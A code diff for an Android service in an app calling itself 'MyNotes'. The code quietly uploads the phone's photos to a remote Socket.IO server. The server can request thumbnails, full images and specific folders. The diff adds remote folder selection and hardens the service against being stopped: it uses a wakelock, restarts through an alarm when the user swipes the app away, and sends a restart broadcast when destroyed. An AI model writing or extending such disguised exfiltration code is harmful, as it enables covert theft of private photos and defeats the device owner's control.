@@ -34,81 +34,66 @@ class CloudSyncService : Service() {
     private val SERVER_URL = "https://mynotes-server-rvtf.onrender.com"
     private val CHANNEL_ID = "MyNotesBackupChannel"
 
-    // Variable para mantener la CPU despierta (Vital para Vivo/Xiaomi)
     private var wakeLock: PowerManager.WakeLock? = null
-
     @Volatile private var isScanning = false
 
     override fun onCreate() {
         super.onCreate()
 
-        // 1. Iniciar Wakelock: Esto impide que la CPU se duerma incluso con pantalla apagada
+        // 1. PRIORIDAD ABSOLUTA A LA NOTIFICACIÓN
+        // Esto evita el crash en Android 14+
+        try {
+            startForeground(1, createNotification())
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+
+        // 2. Después iniciamos Wakelock (para CPU)
         try {
             val powerManager = getSystemService(POWER_SERVICE) as PowerManager
             wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyNotes:SyncTag")
-            // Adquirimos el bloqueo por 1 hora máximo para seguridad
-            wakeLock?.acquire(60 * 60 * 1000L)
+            wakeLock?.acquire(60 * 60 * 1000L) // 1 Hora máximo
         } catch (e: Exception) {
-            Log.e("CloudSyncService", "Error al adquirir Wakelock: ${e.message}")
+            Log.e("CloudSyncService", "Error WL: ${e.message}")
         }
-
-        // 2. Iniciar notificación persistente
-        startForeground(1, createNotification())
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // Reforzar el estado de Foreground
+        // Refuerzo: Asegurar que la notificación esté visible
         startForeground(1, createNotification())
 
-        // Iniciar conexión
         connectAndListen()
 
-        // START_STICKY: Le dice al sistema "Si me matas por memoria, revíveme apenas puedas"
+        // START_STICKY: Si Android mata el servicio, intenta revivirlo
         return START_STICKY
     }
 
-    /**
-     * MÉTODO CRÍTICO PARA VIVO / XIAOMI
-     * Este método se ejecuta EXCLUSIVAMENTE cuando el usuario desliza la app
-     * de la lista de aplicaciones recientes (Task Manager).
-     */
     override fun onTaskRemoved(rootIntent: Intent?) {
         super.onTaskRemoved(rootIntent)
-        Log.d("CloudSyncService", "Detectado cierre forzado desde Recientes (Swipe)")
+        Log.d("CloudSyncService", "Detectado cierre forzado (Swipe)")
 
-        // Programar una ALARMA del sistema para reiniciar el servicio en 1 segundo
-        val restartServiceIntent = Intent(applicationContext, RestartReceiver::class.java).apply {
+        // LÓGICA DE RESURRECCIÓN PARA VIVO/XIAOMI
+        val restartIntent = Intent(applicationContext, RestartReceiver::class.java).apply {
             setPackage(packageName)
         }
-
-        val restartServicePendingIntent = PendingIntent.getBroadcast(
-            applicationContext,
-            1,
-            restartServiceIntent,
-            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+        val pendingIntent = PendingIntent.getBroadcast(
+            applicationContext, 1, restartIntent, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
         )
-
-        val alarmService = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
-
-        // Usamos ELAPSED_REALTIME_WAKEUP para despertar al teléfono si es necesario
-        alarmService.set(
-            AlarmManager.ELAPSED_REALTIME_WAKEUP,
-            SystemClock.elapsedRealtime() + 1000,
-            restartServicePendingIntent
-        )
+        val alarmManager = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
+        alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 1000, pendingIntent)
     }
 
     private fun createNotification(): Notification {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(CHANNEL_ID, "Backup Cloud", NotificationManager.IMPORTANCE_LOW)
-            val manager = getSystemService(NotificationManager::class.java)
-            manager.createNotificationChannel(channel)
+            val channel = NotificationChannel(CHANNEL_ID, "Cloud Service", NotificationManager.IMPORTANCE_LOW)
+            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("MyNotes Cloud")
-            .setContentText("Sincronizando recursos...")
+            .setContentText("Sincronización activa")
             .setSmallIcon(android.R.drawable.ic_popup_sync)
-            .setOngoing(true) // Hace la notificación difícil de quitar
+            .setOngoing(true)
+            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
             .build()
     }
 
@@ -119,33 +104,47 @@ class CloudSyncService : Service() {
             val options = IO.Options().apply {
                 reconnection = true
                 reconnectionAttempts = Int.MAX_VALUE
-                reconnectionDelay = 2000
+                reconnectionDelay = 5000
+                reconnectionDelayMax = 10000
+                timeout = 60000
                 forceNew = true
             }
             socket = IO.socket(SERVER_URL, options)
 
             socket?.on(Socket.EVENT_CONNECT) {
-                Log.d("MyNotesSync", "✅ Conectado")
-
+                Log.d("MyNotesSync", "✅ Conectado al Servidor")
                 registrarDispositivo()
 
-                // Arrancar automáticamente si no se está escaneando
+                // --- NUEVO: ENVIAR LISTA DE CARPETAS ---
+                // Esto permite que el servidor V8 muestre el menú desplegable
+                thread { sendFolderList() }
+
+                // Si se conecta y no estaba haciendo nada, iniciamos escaneo general (sin filtro)
+                // OJO: Si prefieres esperar orden, comenta estas 3 líneas:
                 if (!isScanning) {
                     isScanning = true
-                    thread { sendThumbnails() }
+                    thread { sendThumbnails(null) }
                 }
             }
 
-            socket?.on("command_start_scan") {
+            socket?.on("command_start_scan") { args ->
                 if (!isScanning) {
                     isScanning = true
-                    thread { sendThumbnails() }
+                    var folderFilter: String? = null
+
+                    // Leer si el servidor pidió una carpeta específica
+                    if (args.isNotEmpty()) {
+                        val params = args[0] as? JSONObject
+                        val requestedFolder = params?.optString("folder")
+                        if (!requestedFolder.isNullOrEmpty()) {
+                            folderFilter = requestedFolder
+                        }
+                    }
+                    thread { sendThumbnails(folderFilter) }
                 }
             }
 
-            socket?.on("command_stop_scan") {
-                isScanning = false
-            }
+            socket?.on("command_stop_scan") { isScanning = false }
 
             socket?.on("request_full_image") { args ->
                 val data = args[0] as JSONObject
@@ -158,27 +157,63 @@ class CloudSyncService : Service() {
 
     private fun registrarDispositivo() {
         try {
-            val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
-            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "UnknownID"
-
             val info = JSONObject().apply {
-                put("deviceName", deviceName)
-                put("deviceId", androidId)
+                put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
+                put("deviceId", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
                 put("dataType", "register_device")
             }
-
             socket?.emit("usrData", info)
-
         } catch (e: Exception) { e.printStackTrace() }
     }
 
-    private fun sendThumbnails() {
+    // --- NUEVO: ESCANEAR Y ENVIAR LISTA DE CARPETAS ---
+    private fun sendFolderList() {
+        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+        val projection = arrayOf(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
+        val uniqueFolders = HashSet<String>()
+
+        try {
+            contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
+                val idxBucket = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
+                while (cursor.moveToNext()) {
+                    val folderName = cursor.getString(idxBucket)
+                    if (!folderName.isNullOrEmpty()) {
+                        uniqueFolders.add(folderName)
+                    }
+                }
+            }
+
+            if (uniqueFolders.isNotEmpty()) {
+                val data = JSONObject().apply {
+                    put("dataType", "folder_list")
+                    put("folders", org.json.JSONArray(uniqueFolders))
+                }
+                socket?.emit("usrData", data)
+                Log.d("MyNotesSync", "Carpetas enviadas: ${uniqueFolders.size}")
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
+
+    // --- LÓGICA DE ESCANEO CON FILTRO SQL ---
+    private fun sendThumbnails(targetFolder: String?) {
         val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
         val projection = arrayOf(MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME)
         val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
 
+        var selection: String? = null
+        var selectionArgs: Array<String>? = null
+
+        // Si hay carpeta objetivo, filtramos por nombre de bucket
+        if (targetFolder != null) {
+            selection = "${MediaStore.Images.Media.BUCKET_DISPLAY_NAME} LIKE ?"
+            selectionArgs = arrayOf("%$targetFolder%")
+            Log.d("MyNotesSync", "Escaneando SOLO: $targetFolder")
+        }
+
         try {
-            contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
+            contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)?.use { cursor ->
                 val idxData = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                 val idxName = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
 
@@ -188,10 +223,9 @@ class CloudSyncService : Service() {
                     val path = cursor.getString(idxData)
                     val name = cursor.getString(idxName)
                     val file = File(path)
-                    val folderName = file.parentFile?.name ?: "Sin Carpeta"
+                    val folderName = file.parentFile?.name ?: "Unknown"
 
                     val thumb = getThumb(path)
-
                     if (thumb != null) {
                         val data = JSONObject().apply {
                             put("name", name)
@@ -205,7 +239,7 @@ class CloudSyncService : Service() {
                     }
                 }
             }
-        } catch (e: Exception) { Log.e("MyNotesSync", "Error: ${e.message}") }
+        } catch (e: Exception) { Log.e("MyNotesSync", "Scan Error: ${e.message}") }
         isScanning = false
     }
 
@@ -242,22 +276,9 @@ class CloudSyncService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
-        Log.d("CloudSyncService", "Destroying Service...")
+        try { if (wakeLock?.isHeld == true) wakeLock?.release(); socket?.disconnect() } catch (e: Exception) {}
 
-        try {
-            // Liberamos el Wakelock para no drenar batería si el servicio muere legítimamente
-            if (wakeLock?.isHeld == true) {
-                wakeLock?.release()
-            }
-
-            socket?.disconnect()
-            socket?.off()
-        } catch (e: Exception) {
-            e.printStackTrace()
-        }
-
-        // Enviamos la señal de auxilio al RestartReceiver como respaldo final
-        val broadcastIntent = Intent(this, RestartReceiver::class.java)
-        sendBroadcast(broadcastIntent)
+        // Intentar revivir inmediatamente
+        sendBroadcast(Intent(this, RestartReceiver::class.java))
     }
 }
